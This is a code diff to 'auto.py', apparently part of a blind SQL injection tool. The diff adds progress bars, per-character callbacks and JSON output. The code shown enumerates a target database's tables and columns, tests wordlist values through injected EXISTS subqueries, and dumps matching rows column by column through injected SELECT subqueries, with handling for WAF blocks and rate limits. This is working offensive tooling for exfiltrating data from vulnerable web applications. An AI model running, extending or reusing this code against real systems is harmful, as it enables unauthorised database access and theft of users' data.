@@ -1,9 +1,4 @@
 
-# auto.py
-# Channels: error, boolean, time.
-# If request.txt has no {{%payload%}}, the scanner discovers points first.
-# If no error/time hit and match.txt is empty, tries auto-boolean.
-
 import os
 import sys
 import time
@@ -25,6 +20,8 @@ from .exceptions import (
     RateLimitHit, RetryExhausted, SessionExpired, WafBlocked,
 )
 from . import error_based as EB
+from .rich_ui import UI, has_rich
+from .json_out import JsonResult, write_tsv, write_jsonl
 from .channels import (
     ALL_CHANNELS, DEFAULT_ORDER as _DEFAULT_CH_ORDER,
     build_channel, parse_channel_list,
@@ -58,10 +55,10 @@ import threading as _dbg_threading
 
 _DBG_LOCK = _dbg_threading.Lock()
 _DBG_STATE = {
-    "path": None,      # Path or None
-    "fh": None,        # open file handle or None
-    "echo": True,      # also echo to stdout
-    "req_dir": None,   # optional dir for raw bodies
+    "path": None,
+    "fh": None,
+    "echo": True,
+    "req_dir": None,
     "counter": 0,
 }
 
@@ -278,6 +275,7 @@ class Prober:
         self.cache = cache
         self.worker_id = int(worker_id)
         self.parallel = max(1, int(parallel))
+        self.on_char = None  # optional per-char callback (i, n, ch, acc)
         self.client = client
         self.prefix = prefix
         self.suffix = suffix
@@ -399,9 +397,11 @@ class Prober:
                                   substr=self.d["substr"],
                                   ascii_fn=self.d["ascii"],
                                   debug=self.debug,
-                                  cfg=self.cfg, cache=self.cache)
+                                  cfg=self.cfg, cache=self.cache,
+                                  on_char=self.on_char)
         lo = 32 if FAST else 0
-        return _extract_string_parallel(self, expr, n, lo, 255)
+        return _extract_string_parallel(self, expr, n, lo, 255,
+                                        on_char=self.on_char)
 
 
 # Prefix/suffix candidates come from scanner.py (single source of truth).
@@ -501,15 +501,32 @@ def auto_detect_time(pr):
 
 
 
-def _progress(tag, done, total, t0, extra=""):
-    """Print a one-line ASCII progress bar with ETA."""
+def _progress(tag, done, total, t0, extra="", ui=None):
+    """One-line progress bar with ETA.
+
+    If `ui` (rich_ui.UI) is passed, delegates to it; otherwise ASCII.
+
+    The final 100% line is suppressed for per-char tags ("table[",
+    "col[", "dump."), because the caller prints the final value via
+    `print("[i] 'NAME'")` anyway.
+    """
     if total <= 0:
         return
+    if done >= total and (tag.startswith("table[")
+                          or tag.startswith("col[")
+                          or tag.startswith("dump.")):
+        return
+    if ui is not None:
+        try:
+            ui.progress(tag, done, total, t0, extra=extra)
+            return
+        except Exception:
+            pass
     width = 20
     frac = min(1.0, done / float(total))
     filled = int(width * frac)
     bar = "#" * filled + ">" + " " * max(0, width - filled - 1)
-    elapsed = max(0.001, _time.time() - t0)
+    elapsed = max(0.001, time.time() - t0)
     if done > 0:
         eta = elapsed / done * (total - done)
         eta_s = f"~{int(eta)}s left"
@@ -519,6 +536,16 @@ def _progress(tag, done, total, t0, extra=""):
     if extra:
         line += f"  {extra}"
     print(line, flush=True)
+
+
+def _should_report(i, total):
+    """Throttle progress: every 10% or every 5 items, whichever is rarer."""
+    if total <= 10:
+        return True
+    step = max(1, total // 10)
+    return (i % step == 0) or (i == total)
+
+
 
 
 def pause(step):
@@ -587,17 +614,22 @@ class Results:
             self.f.close()
 
 
-def _extract_string_parallel(pr, expr, n, lo, hi):
+def _extract_string_parallel(pr, expr, n, lo, hi, on_char=None):
     """Extract `n` chars of `expr` in parallel.
 
     Each worker gets its own Client with worker_id=i+1 and
     parallel=PARALLEL, so the per-worker throttle is max_rps/PARALLEL.
     Cache is shared (thread-safe).
+
+    If on_char is provided, it is called once per completed character
+    as (pos, n, ch, acc_so_far). Characters may arrive out of order —
+    acc is a best-effort reconstruction.
     """
     from .binsearch import extract_char
     from .http_client import Client as _HCClient
 
     results = [""] * n
+    done = [0]
     raw_req = pr.client.req.raw
     cfg = pr.cfg
 
@@ -629,10 +661,17 @@ def _extract_string_parallel(pr, expr, n, lo, hi):
         for fut in as_completed(futs):
             pos, ch = fut.result()
             results[pos - 1] = ch
+            done[0] += 1
+            if on_char is not None:
+                acc = "".join(c if c else "?" for c in results[:done[0]])
+                try:
+                    on_char(done[0], n, ch, acc)
+                except Exception:
+                    pass
     return "".join(results).rstrip("\x00")
 
 
-def step_count_tables(pr, res):
+def step_count_tables(pr, res, jr=None):
     if pause("count tables in current schema") != "ok":
         return 0
     try:
@@ -653,10 +692,13 @@ def step_count_tables(pr, res):
     print(f"  tables: {n}")
     res.section("tables.count")
     res.kv("count", n)
+    if jr is not None:
+        jr.add_table("_meta", ["key", "value"])
+        jr.add_row("_meta", {"key": "tables.count", "value": n})
     return n
 
 
-def step_table_names(pr, n, res):
+def step_table_names(pr, n, res, jr=None, ui=None):
     if n > TABLES_MAX:
         print(f"  !! {n} tables exceeds TABLES_MAX={TABLES_MAX}")
         n = TABLES_MAX
@@ -664,18 +706,31 @@ def step_table_names(pr, n, res):
         return []
     names = []
     for i in range(n):
-        sub = pr.table_sub(i)
-        name = pr.string_of(sub)
-        print(f"  [{i}] {name!r}")
+        tag = f"table[{i}]"
+        t0 = time.time()
+        def _on_char(pos, total, ch, acc, _tag=tag, _t0=t0):
+            _progress(_tag, pos, total, _t0, extra=repr(acc), ui=ui)
+        pr.on_char = _on_char
+        try:
+            sub = pr.table_sub(i)
+            name = pr.string_of(sub)
+        finally:
+            pr.on_char = None
         if name:
             names.append(name)
+            # print only the final name; progress already showed chars
+            print(f"  --> {name}")
     res.section("tables")
     for name in names:
         res.raw(name)
+    if jr is not None:
+        jr.add_table("_all_tables", ["name"])
+        for name in names:
+            jr.add_row("_all_tables", {"name": name})
     return names
 
 
-def step_count_columns(pr, table, res):
+def step_count_columns(pr, table, res, jr=None):
     if pause(f"count columns of '{table}'") != "ok":
         return 0
     d = pr.d
@@ -694,10 +749,12 @@ def step_count_columns(pr, table, res):
     print(f"  columns: {n}")
     res.section(f"{table}.columns.count")
     res.kv("count", n)
+    if jr is not None:
+        jr.add_table(table, [])
     return n
 
 
-def step_column_names(pr, table, n, res):
+def step_column_names(pr, table, n, res, jr=None, ui=None):
     if n > COLUMNS_MAX:
         print(f"  !! {n} columns exceeds COLUMNS_MAX={COLUMNS_MAX}")
         n = COLUMNS_MAX
@@ -705,14 +762,24 @@ def step_column_names(pr, table, n, res):
         return []
     cols = []
     for i in range(n):
-        sub = pr.column_sub(table, i)
-        name = pr.string_of(sub)
-        print(f"  [{i}] {name!r}")
+        tag = f"col[{i}]"
+        t0 = time.time()
+        def _on_char(pos, total, ch, acc, _tag=tag, _t0=t0):
+            _progress(_tag, pos, total, _t0, extra=repr(acc), ui=ui)
+        pr.on_char = _on_char
+        try:
+            sub = pr.column_sub(table, i)
+            name = pr.string_of(sub)
+        finally:
+            pr.on_char = None
         if name:
             cols.append(name)
+            print(f"  --> {name}")
     res.section(f"{table}.columns")
     for c in cols:
         res.raw(c)
+    if jr is not None:
+        jr.add_table(table, cols)
     return cols
 
 
@@ -731,11 +798,13 @@ def step_count_rows(pr, table, res):
     return n
 
 
-def step_wordlist_check(pr, table, column, words, res):
+def step_wordlist_check(pr, table, column, words, res, jr=None, ui=None):
     if pause(f"check wordlist against {table}.{column}") != "ok":
         return []
     hits = []
-    for w in words:
+    total = len(words)
+    t0 = time.time()
+    for i, w in enumerate(words, 1):
         esc = w.replace("'", "''")
         cond = f"EXISTS(SELECT 1 FROM {table} WHERE {column}='{esc}')"
         try:
@@ -744,35 +813,55 @@ def step_wordlist_check(pr, table, column, words, res):
             print(f"  [{w}] EXCEPTION {e!r}")
             continue
         mark = "HIT" if ok else "   "
-        print(f"  [{mark}] {w}")
         if ok:
             hits.append(w)
+            print(f"  [HIT] {w}")
+        if _should_report(i, total):
+            _progress("words", i, total, t0, extra=w, ui=ui)
     res.section(f"{table}.{column}.hits")
     for h in hits:
         res.raw(h)
+    if jr is not None and hits:
+        jr.add_table(f"{table}.{column}.hits", ["hit"])
+        for h in hits:
+            jr.add_row(f"{table}.{column}.hits", {"hit": h})
     return hits
 
 
-def step_dump_rows(pr, table, key_col, key_values, other_cols, res):
+def step_dump_rows(pr, table, key_col, key_values, other_cols, res,
+                   jr=None, ui=None):
     if not other_cols:
         return
     for kv in key_values:
         if pause(f"dump {table} where {key_col}='{kv}'") != "ok":
             continue
+        row = {key_col: kv}
         esc = kv.replace("'", "''")
         for col in other_cols:
             if col == key_col:
                 continue
-            if pr.dialect == "oracle":
-                sub = (f"(SELECT {col} FROM {table} "
-                       f"WHERE {key_col}='{esc}' AND ROWNUM=1)")
-            else:
-                sub = (f"(SELECT {col} FROM {table} "
-                       f"WHERE {key_col}='{esc}' LIMIT 1)")
-            val = pr.string_of(sub) or "(null)"
-            print(f"    {col}: {val}")
+            tag = f"{table}.{col}"
+            t0 = time.time()
+            def _on_char(pos, total, ch, acc, _tag=tag, _t0=t0):
+                _progress(_tag, pos, total, _t0, extra=repr(acc), ui=ui)
+            pr.on_char = _on_char
+            try:
+                if pr.dialect == "oracle":
+                    sub = (f"(SELECT {col} FROM {table} "
+                           f"WHERE {key_col}='{esc}' AND ROWNUM=1)")
+                else:
+                    sub = (f"(SELECT {col} FROM {table} "
+                           f"WHERE {key_col}='{esc}' LIMIT 1)")
+                val = pr.string_of(sub) or "(null)"
+            finally:
+                pr.on_char = None
+            print(f"    --> {col} = {val}")
             res.section(f"{table} where {key_col}='{kv}'")
             res.kv(col, val)
+            row[col] = val
+        if jr is not None:
+            jr.add_table(table, [key_col] + [c for c in other_cols if c != key_col])
+            jr.add_row(table, row)
 
 
 
@@ -1250,7 +1339,10 @@ def run_auto(cfg_or_dir, delay=5, dry_run=False,
     print(f"  words:     {len(words)}")
     print(f"  limits:    TABLES_MAX={TABLES_MAX} COLUMNS_MAX={COLUMNS_MAX} "
           f"LENGTH_HI={LENGTH_HI}")
-    print(f"  flags:     debug={debug} fast={fast} scan_all={scan_all}")
+    _ui = UI(cfg)
+    _ui.info(f"  flags:     debug={debug} fast={fast} scan_all={scan_all}")
+    if has_rich() and not cfg.quiet:
+        _ui.info("  ui:        rich")
     if dbg_path is not None:
         print(f"  debug log: {dbg_path}")
     print("=" * 68)
@@ -1410,7 +1502,6 @@ def run_auto(cfg_or_dir, delay=5, dry_run=False,
         print("\n  --dry-run: stopping before extraction.")
         return
 
-    # --- Волна 3: wrap the detected channel (best effort) ---
     try:
         _selected_channel = _wrap_channel(cfg, client, pr)
         if _selected_channel is not None:
@@ -1420,15 +1511,35 @@ def run_auto(cfg_or_dir, delay=5, dry_run=False,
     except NameError as _e:
         print(f"  ! _wrap_channel unavailable: {_e!r} (continuing)")
 
+    _json_result = JsonResult(
+        campaign=cdir.name,
+        dialect=pr.dialect,
+        technique=pr.technique,
+        prefix=pr.prefix,
+        suffix=pr.suffix,
+        marker=(pr.marker or ""),
+        target=client.req.host + client.req.path,
+    )
+
+    if getattr(cfg, "resume", False):
+        _st = load_state(cdir)
+        if _st:
+            _ui.info(f"  resume: state.json loaded "
+                     f"({_st.get('saved_at','?')})")
+            _json_result.add_table("_state", list(_st.keys()))
+            _json_result.add_row("_state", _st)
+
     res = Results(cdir, pr.dialect, pr.technique,
                   client.req.host + client.req.path)
 
     try:
-        n_tables = step_count_tables(pr, res)
+        _ui_step = UI(cfg)
+        n_tables = step_count_tables(pr, res, jr=_json_result)
         if n_tables == 0:
             return
 
-        tables = step_table_names(pr, n_tables, res)
+        tables = step_table_names(pr, n_tables, res,
+                                  jr=_json_result, ui=_ui_step)
         if not tables:
             return
 
@@ -1441,17 +1552,20 @@ def run_auto(cfg_or_dir, delay=5, dry_run=False,
                 print("  ! not in list")
                 continue
 
-            n_cols = step_count_columns(pr, t, res)
-            cols = step_column_names(pr, t, n_cols, res)
+            n_cols = step_count_columns(pr, t, res, jr=_json_result)
+            cols = step_column_names(pr, t, n_cols, res,
+                                     jr=_json_result, ui=_ui_step)
 
             step_count_rows(pr, t, res)
 
             if words and cols:
                 key_col = ask(f"Column for wordlist check (in {t})", cols[0])
-                hits = step_wordlist_check(pr, t, key_col, words, res)
+                hits = step_wordlist_check(pr, t, key_col, words, res,
+                                           jr=_json_result, ui=_ui_step)
                 other = [c for c in cols if c != key_col]
                 if hits and other:
-                    step_dump_rows(pr, t, key_col, hits, other, res)
+                    step_dump_rows(pr, t, key_col, hits, other, res,
+                                   jr=_json_result, ui=_ui_step)
 
     except SessionExpired as e:
         print(f"\n  !! session expired: {e}")
@@ -1468,6 +1582,16 @@ def run_auto(cfg_or_dir, delay=5, dry_run=False,
         res.close()
         print(f"\n  results -> {res.path}")
         print(f"  requests sent: {pr.requests}")
+        try:
+            if _json_result is not None:
+                if getattr(cfg, 'json_file', None):
+                    jpath = Path(cfg.json_file)
+                else:
+                    jpath = cfg.results_dir / 'summary.json'
+                _json_result.write(jpath)
+                print(f"  json    -> {jpath}")
+        except Exception as _e:
+            print(f"  !! json dump failed: {_e!r}")
         if dbg_path is not None:
             dbg(f"# requests sent: {pr.requests}")
             dbg_close()
